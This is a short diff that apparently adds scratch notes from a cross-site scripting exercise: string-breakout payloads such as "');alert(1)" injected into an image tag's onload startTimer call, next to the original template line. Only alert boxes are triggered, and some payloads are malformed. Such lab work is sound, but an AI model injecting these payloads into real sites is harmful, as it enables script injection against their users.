@@ -1,0 +1,6 @@
+');alert(renat)
+');alert('Hacked)
+
+ <img src="/static/loading.gif" onload="startTimer('');alert(1)('');" />
+ 
+  <img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
